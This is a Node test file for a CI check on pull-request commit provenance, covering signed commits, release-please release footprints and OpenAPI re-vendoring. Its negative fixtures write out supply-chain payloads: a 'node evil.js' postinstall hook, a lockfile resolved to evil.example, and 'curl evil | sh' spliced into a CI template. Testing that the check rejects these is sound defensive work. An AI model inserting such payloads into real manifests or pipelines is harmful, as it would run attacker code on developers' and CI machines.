import test from "node:test";
import assert from "node:assert/strict";

import {
  classifyCommit,
  compareRevendorSource,
  extraFilesFrom,
  isLabelVouch,
  isNextVersion,
  isReleasePullRequest,
  isRevendorPullRequest,
  isTrustedSignerCommit,
  judgePullRequest,
  MAX_COMPARE_COMMITS,
  parseNameStatus,
  releaseFootprintReasons,
  revendorFootprintReasons,
  versionMarkedLines,
} from "./commit-provenance.mjs";

const SSH = "-----BEGIN SSH SIGNATURE-----\nabc\n-----END SSH SIGNATURE-----";
const PGP = "-----BEGIN PGP SIGNATURE-----\nabc\n-----END PGP SIGNATURE-----";

function signed(sha, { login = "Monoradioactivo", signature = SSH, reason = "valid", verified = true, parents = ["p0"], tree = "t0" } = {}) {
  return {
    sha,
    parents: parents.map((parent) => ({ sha: parent })),
    committer: { login },
    commit: { tree: { sha: tree }, verification: { verified, reason, signature } },
  };
}

function webFlow(sha, options = {}) {
  return signed(sha, { login: "web-flow", signature: PGP, ...options });
}

const onMain = new Set(["main1", "main2"]);
const mergeTrees = new Map([["pr1|main1", "clean-tree"]]);
const hooks = {
  isAncestorOfMain: (sha) => onMain.has(sha),
  mergeTreeOf: (first, second) => mergeTrees.get(`${first}|${second}`) ?? null,
};

const adrianPull = { author: "Monoradioactivo", headRef: "chore/something" };
const releasePull = { author: "aetherpush-release-bot[bot]", headRef: "release-please--branches--main--components--aether-server" };
const revendorPull = { author: "aetherpush-release-bot[bot]", headRef: "chore/openapi-revendor" };
const pushEvent = { action: "synchronize", label: "", sender: "Monoradioactivo" };

function judge(overrides) {
  const commits = overrides.commits;
  return judgePullRequest({
    baseRef: "main",
    pullRequest: adrianPull,
    event: pushEvent,
    totalCommits: commits.length,
    gitCommitShas: commits.map((commit) => commit.sha),
    changes: [],
    read: () => null,
    releaseConfigured: true,
    ...hooks,
    ...overrides,
  });
}

test("a commit SSH-signed by a trusted account is trusted", () => {
  assert.equal(isTrustedSignerCommit(signed("a1")), true);
});

test("a signature that is not SSH, not valid, or from another account is not trusted", () => {
  assert.equal(isTrustedSignerCommit(signed("a1", { signature: PGP })), false);
  assert.equal(isTrustedSignerCommit(signed("a1", { reason: "unknown_key" })), false);
  assert.equal(isTrustedSignerCommit(signed("a1", { verified: false })), false);
  assert.equal(isTrustedSignerCommit(signed("a1", { login: "someone-else" })), false);
  assert.equal(isTrustedSignerCommit(signed("a1", { login: "web-flow" })), false);
  assert.equal(isTrustedSignerCommit(signed("a1", { login: null })), false);
});

test("a pull request whose commits are all SSH-signed by the trusted account passes", () => {
  const verdict = judge({ commits: [signed("a1"), signed("a2")] });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.via, "every commit is trusted");
});

test("a web-flow commit the release bot key created fails an ordinary pull request", () => {
  const verdict = judge({ commits: [signed("a1"), webFlow("x1")] });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /x1 is not signed by a trusted key/);
});

test("a clean merge of main made by the behind bot or the Update branch button passes", () => {
  const merge = webFlow("m1", { parents: ["pr1", "main1"], tree: "clean-tree" });
  assert.deepEqual(classifyCommit(merge, hooks), { sha: "m1", ok: true, via: "clean merge of main" });
  assert.equal(judge({ commits: [signed("pr1"), merge] }).ok, true);
});

test("a merge commit whose tree differs from a clean merge of its parents fails", () => {
  const forged = webFlow("m1", { parents: ["pr1", "main1"], tree: "attacker-tree" });
  const verdict = judge({ commits: [signed("pr1"), forged] });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /differs from a clean merge/);
});

test("a merge commit that brings in a commit not on main fails", () => {
  const forged = webFlow("m1", { parents: ["pr1", "old-branch"], tree: "clean-tree" });
  const verdict = judge({ commits: [signed("pr1"), forged] });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /which is not on main/);
});

test("a merge commit whose parents do not merge cleanly fails", () => {
  const conflicted = webFlow("m1", { parents: ["pr1", "main2"], tree: "clean-tree" });
  const verdict = judge({ commits: [signed("pr1"), conflicted] });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /does not merge its parents cleanly/);
});

test("the label vouches only on its own labeled event, applied by an allowed actor", () => {
  assert.equal(isLabelVouch({ action: "labeled", label: "brief-verified", sender: "Monoradioactivo" }), true);
  assert.equal(isLabelVouch({ action: "synchronize", label: "", sender: "Monoradioactivo" }), false);
  assert.equal(isLabelVouch({ action: "labeled", label: "brief-verified", sender: "aetherpush-release-bot[bot]" }), false);
  assert.equal(isLabelVouch({ action: "labeled", label: "dependencies", sender: "Monoradioactivo" }), false);
  assert.equal(isLabelVouch({ action: "unlabeled", label: "brief-verified", sender: "Monoradioactivo" }), false);
});

test("a Renovate pull request passes on the labeled event and fails on the next push", () => {
  const renovate = webFlow("r1");
  const labeled = judge({ commits: [renovate], event: { action: "labeled", label: "brief-verified", sender: "Monoradioactivo" } });
  assert.equal(labeled.ok, true);
  assert.equal(labeled.via, "brief-verified label applied by Monoradioactivo");
  assert.equal(judge({ commits: [renovate] }).ok, false);
});

test("a pull request with more commits than the check reads fails closed", () => {
  const commits = [signed("a1")];
  const verdict = judge({ commits, totalCommits: MAX_COMPARE_COMMITS + 1 });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons[0], /judges at most 250/);
  assert.equal(judge({ commits, totalCommits: 2 }).ok, false);
});

test("a pull request into any branch other than main fails, whatever its commits", () => {
  const verdict = judge({ commits: [signed("a1")], baseRef: "attacker-branch" });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons[0], /targets attacker-branch; the check judges pull requests into main/);
  assert.equal(judge({ commits: [signed("a1")], baseRef: undefined }).ok, false);
  const labeled = judge({
    commits: [webFlow("r1")],
    baseRef: "attacker-branch",
    event: { action: "labeled", label: "brief-verified", sender: "Monoradioactivo" },
  });
  assert.equal(labeled.ok, false);
});

test("a pull request with no commits ahead of main fails", () => {
  const verdict = judge({ commits: [] });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons[0], /carries no commits ahead of main/);
});

test("commits GitHub reports that differ from the fetched history fail closed", () => {
  const verdict = judge({ commits: [signed("a1")], gitCommitShas: ["a1", "hidden"] });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons[0], /differ from the commits in the fetched history/);
});

test("only a release-please branch opened by the release bot is a release pull request", () => {
  assert.equal(isReleasePullRequest(releasePull), true);
  assert.equal(isReleasePullRequest({ ...releasePull, headRef: "chore/anything" }), false);
  assert.equal(isReleasePullRequest({ ...releasePull, author: "Monoradioactivo" }), false);
});

test("the next version is one patch, minor or major step", () => {
  assert.equal(isNextVersion("3.15.3", "3.15.4"), true);
  assert.equal(isNextVersion("3.15.3", "3.16.0"), true);
  assert.equal(isNextVersion("3.15.3", "4.0.0"), true);
  assert.equal(isNextVersion("0.9.3", "0.99.0"), false);
  assert.equal(isNextVersion("3.15.3", "3.15.3"), false);
  assert.equal(isNextVersion("3.15.3", "3.16.1"), false);
  assert.equal(isNextVersion(undefined, "1.0.0"), false);
});

const basePackage = { name: "aether-server", version: "3.15.3", scripts: { test: "jest" } };
const baseLock = { name: "aether-server", version: "3.15.3", lockfileVersion: 3, packages: { "": { name: "aether-server", version: "3.15.3" }, "node_modules/a": { version: "1.0.0", resolved: "https://registry.npmjs.org/a/-/a-1.0.0.tgz", integrity: "sha512-good" } } };
const template = "image: node:22\nscript:\n  - npx @aetherpush/cli@0.9.3 release # x-release-please-version\n";

function releaseFiles(overrides = {}) {
  const files = {
    base: {
      "package.json": JSON.stringify(basePackage, null, 2),
      "package-lock.json": JSON.stringify(baseLock, null, 2),
      ".release-please-manifest.json": JSON.stringify({ ".": "3.15.3" }),
      "examples/ci/gitlab-ci.yml": template,
    },
    head: {
      "package.json": JSON.stringify({ ...basePackage, version: "3.15.4" }, null, 2),
      "package-lock.json": JSON.stringify({ ...baseLock, version: "3.15.4", packages: { ...baseLock.packages, "": { name: "aether-server", version: "3.15.4" } } }, null, 2),
      ".release-please-manifest.json": JSON.stringify({ ".": "3.15.4" }),
      "examples/ci/gitlab-ci.yml": template.replace("0.9.3", "3.15.4"),
    },
  };
  for (const [side, entries] of Object.entries(overrides)) Object.assign(files[side], entries);
  return (path, side) => files[side][path] ?? null;
}

const releaseChanges = [
  { path: "CHANGELOG.md", status: "M", deletions: 0 },
  { path: "package.json", status: "M", deletions: 1 },
  { path: "package-lock.json", status: "M", deletions: 2 },
  { path: ".release-please-manifest.json", status: "M", deletions: 1 },
  { path: "examples/ci/gitlab-ci.yml", status: "M", deletions: 1 },
];
const extraFiles = ["examples/ci/gitlab-ci.yml"];

test("a release pull request inside the release-please footprint has no reasons", () => {
  assert.deepEqual(releaseFootprintReasons({ changes: releaseChanges, read: releaseFiles(), extraFiles }), []);
});

test("a release pull request built by the release bot passes on its footprint", () => {
  const verdict = judge({
    pullRequest: releasePull,
    commits: [webFlow("rel1")],
    changes: releaseChanges,
    read: releaseFiles(),
    extraFiles,
  });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.via, "release pull request inside the release-please footprint");
});

test("a release pull request that changes a file outside the footprint fails", () => {
  const verdict = judge({
    pullRequest: releasePull,
    commits: [webFlow("rel1")],
    changes: [...releaseChanges, { path: "script/server.ts", status: "M", deletions: 3 }],
    read: releaseFiles(),
    extraFiles,
  });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /script\/server.ts is outside the release footprint/);
});

test("the same diff on a release branch the release bot did not open is judged commit by commit", () => {
  const verdict = judge({
    pullRequest: { ...releasePull, author: "someone-else" },
    commits: [webFlow("rel1")],
    changes: releaseChanges,
    read: releaseFiles(),
    extraFiles,
  });
  assert.equal(verdict.ok, false);
});

test("a package.json change beyond the version fails the footprint", () => {
  const read = releaseFiles({ head: { "package.json": JSON.stringify({ ...basePackage, version: "3.15.4", scripts: { test: "jest", postinstall: "node evil.js" } }) } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n"), /package.json changes more than its version/);
});

test("a lockfile change beyond its two version fields fails the footprint", () => {
  const poisoned = { ...baseLock, version: "3.15.4", packages: { "": { name: "aether-server", version: "3.15.4" }, "node_modules/a": { version: "1.0.0", resolved: "https://evil.example/a.tgz", integrity: "sha512-evil" } } };
  const read = releaseFiles({ head: { "package-lock.json": JSON.stringify(poisoned) } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n"), /package-lock.json changes more than its two version fields/);
});

test("a lockfile that misses the new version in either place fails the footprint", () => {
  const stale = { ...baseLock, version: "3.15.4" };
  const read = releaseFiles({ head: { "package-lock.json": JSON.stringify(stale) } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n"), /does not carry the new version in both places/);
});

test("a version jump beyond the next patch, minor or major fails the footprint", () => {
  const read = releaseFiles({
    head: {
      "package.json": JSON.stringify({ ...basePackage, version: "3.99.0" }),
      "package-lock.json": JSON.stringify({ ...baseLock, version: "3.99.0", packages: { ...baseLock.packages, "": { name: "aether-server", version: "3.99.0" } } }),
      ".release-please-manifest.json": JSON.stringify({ ".": "3.99.0" }),
      "examples/ci/gitlab-ci.yml": template.replace("0.9.3", "3.99.0"),
    },
  });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n"), /from 3.15.3 to 3.99.0/);
});

test("an extra file may change only the version on its marked lines", () => {
  const unmarked = releaseFiles({ head: { "examples/ci/gitlab-ci.yml": template.replace("0.9.3", "3.15.4").replace("node:22", "node:23") } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read: unmarked, extraFiles }).join("\n"), /gitlab-ci.yml:1 changes a line that carries no x-release-please-version marker/);
  const widened = releaseFiles({ head: { "examples/ci/gitlab-ci.yml": template.replace("npx @aetherpush/cli@0.9.3 release", "curl evil | sh; npx @aetherpush/cli@3.15.4 release") } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read: widened, extraFiles }).join("\n"), /gitlab-ci.yml:3 changes more than the version/);
  const wrongVersion = releaseFiles({ head: { "examples/ci/gitlab-ci.yml": template.replace("0.9.3", "9.9.9") } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read: wrongVersion, extraFiles }).join("\n"), /gitlab-ci.yml:3 does not carry 3.15.4/);
  const longer = releaseFiles({ head: { "examples/ci/gitlab-ci.yml": `${template.replace("0.9.3", "3.15.4")}  - curl evil | sh\n` } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read: longer, extraFiles }).join("\n"), /changes its line count/);
});

test("a changelog that removes lines fails the footprint", () => {
  const changes = releaseChanges.map((change) => (change.path === "CHANGELOG.md" ? { ...change, deletions: 4 } : change));
  assert.match(releaseFootprintReasons({ changes, read: releaseFiles(), extraFiles }).join("\n"), /CHANGELOG.md removes lines/);
});

test("a changelog that is deleted, retyped or binary fails the footprint", () => {
  const withChangelog = (entry) => releaseChanges.map((change) => (change.path === "CHANGELOG.md" ? { ...change, ...entry } : change));
  assert.match(releaseFootprintReasons({ changes: withChangelog({ status: "D" }), read: releaseFiles(), extraFiles }).join("\n"), /CHANGELOG.md is removed/);
  assert.match(releaseFootprintReasons({ changes: withChangelog({ status: "T" }), read: releaseFiles(), extraFiles }).join("\n"), /CHANGELOG.md is removed/);
  assert.match(releaseFootprintReasons({ changes: withChangelog({ deletions: Number.NaN }), read: releaseFiles(), extraFiles }).join("\n"), /CHANGELOG.md removes lines/);
});

test("the manifest may change only its root version", () => {
  const read = releaseFiles({ head: { ".release-please-manifest.json": JSON.stringify({ ".": "3.15.4", "packages/other": "9.0.0" }) } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n"), /changes more than the root version/);
});

test("a manifest that misses the new version fails the footprint", () => {
  const read = releaseFiles({ head: { ".release-please-manifest.json": JSON.stringify({ ".": "3.15.3" }) } });
  assert.match(releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n"), /does not carry the new version/);
});

test("a package.json that is not valid JSON fails the footprint", () => {
  const read = releaseFiles({ head: { "package.json": "{ not json" } });
  const reasons = releaseFootprintReasons({ changes: releaseChanges, read, extraFiles }).join("\n");
  assert.match(reasons, /which is not the next patch, minor or major/);
  assert.match(reasons, /package.json is not valid JSON on both sides/);
});

test("a release pull request tolerates a web-flow merge that fails the merge rule and is judged by its whole diff", () => {
  const strayMerge = webFlow("m9", { parents: ["rel1", "old-branch"], tree: "clean-tree" });
  const clean = judge({
    pullRequest: releasePull,
    commits: [webFlow("rel1"), strayMerge],
    changes: releaseChanges,
    read: releaseFiles(),
    extraFiles,
  });
  assert.equal(clean.ok, true);
  const widened = judge({
    pullRequest: releasePull,
    commits: [webFlow("rel1"), strayMerge],
    changes: [...releaseChanges, { path: "script/server.ts", status: "M", deletions: 0 }],
    read: releaseFiles(),
    extraFiles,
  });
  assert.equal(widened.ok, false);
});

test("a footprint file that is added or removed fails", () => {
  const changes = [...releaseChanges.filter((change) => change.path !== "package-lock.json"), { path: "package-lock.json", status: "D", deletions: 90 }];
  assert.match(releaseFootprintReasons({ changes, read: releaseFiles(), extraFiles }).join("\n"), /package-lock.json is added, removed or renamed/);
});

test("a release pull request carrying a commit signed by an unknown key fails", () => {
  const verdict = judge({
    pullRequest: releasePull,
    commits: [webFlow("rel1"), signed("unknown", { login: "someone-else" })],
    changes: releaseChanges,
    read: releaseFiles(),
    extraFiles,
  });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /unknown is not signed by a trusted key/);
});

test("name-status and numstat output parse into changes with deletions", () => {
  assert.deepEqual(parseNameStatus("M\tpackage.json\nA\tCHANGELOG.md\nM\tassets/logo.png\n", "1\t1\tpackage.json\n7\t0\tCHANGELOG.md\n-\t-\tassets/logo.png\n"), [
    { path: "package.json", status: "M", deletions: 1 },
    { path: "CHANGELOG.md", status: "A", deletions: 0 },
    { path: "assets/logo.png", status: "M", deletions: Number.NaN },
  ]);
});

test("extra files come from the root package or the top level of release-please-config.json", () => {
  assert.deepEqual(extraFilesFrom({ packages: { ".": { "extra-files": [{ type: "generic", path: "examples/ci/Jenkinsfile" }, "README.md"] } } }), ["examples/ci/Jenkinsfile", "README.md"]);
  assert.deepEqual(extraFilesFrom({ "extra-files": ["a.yml"] }), ["a.yml"]);
  assert.deepEqual(extraFilesFrom(null), []);
});

test("a release pull request in a repository whose main carries no release-please config fails", () => {
  const verdict = judge({
    pullRequest: releasePull,
    commits: [webFlow("rel1")],
    changes: releaseChanges,
    read: releaseFiles(),
    extraFiles,
    releaseConfigured: false,
  });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /main carries no release-please-config.json/);
  const defaulted = judgePullRequest({
    baseRef: "main",
    pullRequest: releasePull,
    event: pushEvent,
    commits: [webFlow("rel1")],
    totalCommits: 1,
    gitCommitShas: ["rel1"],
    changes: releaseChanges,
    read: releaseFiles(),
    extraFiles,
    ...hooks,
  });
  assert.equal(defaulted.ok, false);
});

const readme = [
  "# Aether deploy action",
  "```yaml",
  "      # x-release-please-start-version",
  "      - uses: Monoradioactivo/aetherpush-deploy-action@v0.6.4",
  "      # x-release-please-end",
  "```",
  "Pin a tag such as v0.6.4 in your workflow.",
  "",
].join("\n");
const simpleManifestBase = JSON.stringify({ ".": "0.6.4" }, null, 2);
const simpleManifestHead = JSON.stringify({ ".": "0.6.5" }, null, 2);

function simpleReleaseFiles(overrides = {}) {
  const files = {
    base: { ".release-please-manifest.json": simpleManifestBase, "README.md": readme },
    head: { ".release-please-manifest.json": simpleManifestHead, "README.md": readme.replace("@v0.6.4", "@v0.6.5") },
  };
  for (const [side, entries] of Object.entries(overrides)) Object.assign(files[side], entries);
  return (path, side) => files[side][path] ?? null;
}

const simpleReleaseChanges = [
  { path: "CHANGELOG.md", status: "M", deletions: 0 },
  { path: ".release-please-manifest.json", status: "M", deletions: 1 },
  { path: "README.md", status: "M", deletions: 1 },
];

test("a release pull request in a repository without package.json takes its version from the manifest", () => {
  assert.deepEqual(releaseFootprintReasons({ changes: simpleReleaseChanges, read: simpleReleaseFiles(), extraFiles: ["README.md"] }), []);
  const verdict = judge({
    pullRequest: { ...releasePull, headRef: "release-please--branches--main--components--aetherpush-deploy-action" },
    commits: [webFlow("rel1")],
    changes: simpleReleaseChanges,
    read: simpleReleaseFiles(),
    extraFiles: ["README.md"],
  });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.via, "release pull request inside the release-please footprint");
});

test("a manifest version jump beyond the next step fails a release without package.json", () => {
  const read = simpleReleaseFiles({
    head: { ".release-please-manifest.json": JSON.stringify({ ".": "0.9.0" }), "README.md": readme.replace("@v0.6.4", "@v0.9.0") },
  });
  assert.match(
    releaseFootprintReasons({ changes: simpleReleaseChanges, read, extraFiles: ["README.md"] }).join("\n"),
    /\.release-please-manifest\.json moves the version from 0\.6\.4 to 0\.9\.0/,
  );
});

test("a release without package.json that adds one fails the footprint", () => {
  const changes = [...simpleReleaseChanges, { path: "package.json", status: "A", deletions: 0 }];
  assert.match(
    releaseFootprintReasons({ changes, read: simpleReleaseFiles(), extraFiles: ["README.md"] }).join("\n"),
    /package.json is added, removed or renamed/,
  );
});

test("lines inside a version block and lines carrying the inline marker are the only version lines", () => {
  const lines = ["a 1.0.0", "# x-release-please-start-version", "b 1.0.0", "c 1.0.0", "# x-release-please-end", "d 1.0.0", "e 1.0.0 # x-release-please-version"];
  const { marked, unterminated } = versionMarkedLines(lines);
  assert.deepEqual([...marked], [2, 3, 6]);
  assert.equal(unterminated, false);
});

test("a version block that never closes fails the footprint", () => {
  const open = readme.replace("      # x-release-please-end\n", "      # closed elsewhere\n");
  const read = simpleReleaseFiles({ base: { "README.md": open }, head: { "README.md": open.replace("@v0.6.4", "@v0.6.5") } });
  assert.equal(versionMarkedLines(open.split("\n")).unterminated, true);
  assert.match(
    releaseFootprintReasons({ changes: simpleReleaseChanges, read, extraFiles: ["README.md"] }).join("\n"),
    /README.md opens a x-release-please-start-version block that no x-release-please-end closes/,
  );
});

test("a README line inside a version block may change only its version", () => {
  const extra = ["README.md"];
  const retargeted = simpleReleaseFiles({ head: { "README.md": readme.replace("Monoradioactivo/aetherpush-deploy-action@v0.6.4", "attacker/aetherpush-deploy-action@v0.6.5") } });
  assert.match(
    releaseFootprintReasons({ changes: simpleReleaseChanges, read: retargeted, extraFiles: extra }).join("\n"),
    /README.md:4 changes more than the version/,
  );
  const outside = simpleReleaseFiles({ head: { "README.md": readme.replace("@v0.6.4", "@v0.6.5").replace("such as v0.6.4", "such as v0.6.5") } });
  assert.match(
    releaseFootprintReasons({ changes: simpleReleaseChanges, read: outside, extraFiles: extra }).join("\n"),
    /README.md:7 changes a line that carries no x-release-please-version marker and sits in no x-release-please-start-version block/,
  );
  const unfenced = simpleReleaseFiles({ head: { "README.md": readme.replace("@v0.6.4", "@v0.6.5").replace("      # x-release-please-end", "      # x-release-please-end 0.6.5") } });
  assert.match(
    releaseFootprintReasons({ changes: simpleReleaseChanges, read: unfenced, extraFiles: extra }).join("\n"),
    /README.md:5 changes a line that carries no x-release-please-version marker/,
  );
});

test("only the release bot's chore/openapi-revendor branch is a re-vendor pull request", () => {
  assert.equal(isRevendorPullRequest(revendorPull), true);
  assert.equal(isRevendorPullRequest({ ...revendorPull, author: "Monoradioactivo" }), false);
  assert.equal(isRevendorPullRequest({ ...revendorPull, headRef: "chore/openapi-revendor-2" }), false);
  assert.equal(isRevendorPullRequest({ ...revendorPull, headRef: "chore/openapi" }), false);
});

const revendorChanges = [{ path: "openapi/openapi.yaml", status: "M", deletions: 8 }];
const unchangedBase = { baseBlob: "0123456789ab", mainBlob: "0123456789ab" };

test("a re-vendor pull request that modifies the vendored spec alone, byte for byte the staging spec, passes", () => {
  const verdict = judge({ pullRequest: revendorPull, commits: [webFlow("rv1")], changes: revendorChanges, revendorSourceReason: null });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.via, "re-vendor pull request whose openapi/openapi.yaml matches https://api-staging.aetherpush.com/openapi.yaml");
});

test("a re-vendor pull request fails when its spec was not compared with staging or differs from it", () => {
  const uncompared = judge({ pullRequest: revendorPull, commits: [webFlow("rv1")], changes: revendorChanges });
  assert.equal(uncompared.ok, false);
  assert.match(uncompared.reasons.join("\n"), /the vendored spec was not compared with https:\/\/api-staging.aetherpush.com\/openapi.yaml/);
  const differs = judge({
    pullRequest: revendorPull,
    commits: [webFlow("rv1")],
    changes: revendorChanges,
    revendorSourceReason: compareRevendorSource({ ...unchangedBase, head: Buffer.from("openapi: 3.1.0\nx: attacker\n"), source: Buffer.from("openapi: 3.1.0\n") }),
  });
  assert.equal(differs.ok, false);
  assert.match(differs.reasons.join("\n"), /openapi\/openapi.yaml at the head \(27 bytes\) differs from https:\/\/api-staging.aetherpush.com\/openapi.yaml \(15 bytes\)/);
});

test("the staging comparison is byte for byte and fails closed on a fetch error or a missing spec", () => {
  const spec = Buffer.from("openapi: 3.1.0\n");
  assert.equal(compareRevendorSource({ ...unchangedBase, head: spec, source: Buffer.from("openapi: 3.1.0\n") }), null);
  assert.match(compareRevendorSource({ ...unchangedBase, head: spec, source: Buffer.from("openapi: 3.1.0\r\n") }), /differs from https/);
  assert.match(compareRevendorSource({ ...unchangedBase, head: Buffer.from([0xef, 0xbb, 0xbf, ...spec]), source: spec }), /differs from https/);
  assert.match(compareRevendorSource({ ...unchangedBase, head: spec, error: "HTTP 503" }), /could not read https:\/\/api-staging.aetherpush.com\/openapi.yaml: HTTP 503/);
  assert.match(compareRevendorSource({ ...unchangedBase, head: null, source: spec }), /openapi\/openapi.yaml is missing at the head/);
  assert.match(compareRevendorSource({ ...unchangedBase, head: spec }), /differs from https/);
});

test("the staging comparison fails when main changed the spec after the pull request's base", () => {
  const spec = Buffer.from("openapi: 3.1.0\n");
  const moved = compareRevendorSource({ baseBlob: "0123456789ab", mainBlob: "fedcba987654", head: spec, source: spec });
  assert.match(moved, /openapi\/openapi.yaml on main \(fedcba9\) differs from the pull request's base \(0123456\), so a squash would land a merge the check did not compare/);
  assert.match(compareRevendorSource({ baseBlob: null, mainBlob: "fedcba987654", head: spec, source: spec }), /differs from the pull request's base \(absent\)/);
  assert.match(compareRevendorSource({ head: spec, source: spec }), /on main \(absent\) differs from the pull request's base \(absent\)/);
});

test("a re-vendor pull request that changes any other file fails", () => {
  const verdict = judge({
    pullRequest: revendorPull,
    revendorSourceReason: null,
    commits: [webFlow("rv1")],
    changes: [...revendorChanges, { path: "scripts/check-openapi-sync.mjs", status: "M", deletions: 1 }],
  });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /scripts\/check-openapi-sync.mjs is outside the re-vendor footprint/);
});

test("a re-vendor pull request that adds, deletes or leaves out the spec fails", () => {
  assert.match(revendorFootprintReasons([{ path: "openapi/openapi.yaml", status: "A", deletions: 0 }]).join("\n"), /openapi\/openapi.yaml is outside the re-vendor footprint/);
  assert.match(revendorFootprintReasons([{ path: "openapi/openapi.yaml", status: "D", deletions: 90 }]).join("\n"), /does not modify openapi\/openapi.yaml/);
  assert.match(revendorFootprintReasons([]).join("\n"), /does not modify openapi\/openapi.yaml/);
});

test("the re-vendor diff on another author's or another branch's pull request is judged commit by commit", () => {
  const otherAuthor = judge({ pullRequest: { ...revendorPull, author: "someone-else" }, commits: [webFlow("rv1")], changes: revendorChanges, revendorSourceReason: null });
  assert.equal(otherAuthor.ok, false);
  assert.deepEqual(otherAuthor.reasons, ["commit rv1 is not signed by a trusted key"]);
  const otherBranch = judge({ pullRequest: { ...revendorPull, headRef: "chore/openapi-revendor-x" }, commits: [webFlow("rv1")], changes: revendorChanges, revendorSourceReason: null });
  assert.equal(otherBranch.ok, false);
  assert.deepEqual(otherBranch.reasons, ["commit rv1 is not signed by a trusted key"]);
});

test("a re-vendor pull request carrying a commit signed by an unknown key fails", () => {
  const verdict = judge({
    pullRequest: revendorPull,
    commits: [webFlow("rv1"), signed("unknown", { login: "someone-else" })],
    changes: revendorChanges,
    revendorSourceReason: null,
  });
  assert.equal(verdict.ok, false);
  assert.match(verdict.reasons.join("\n"), /unknown is not signed by a trusted key/);
});
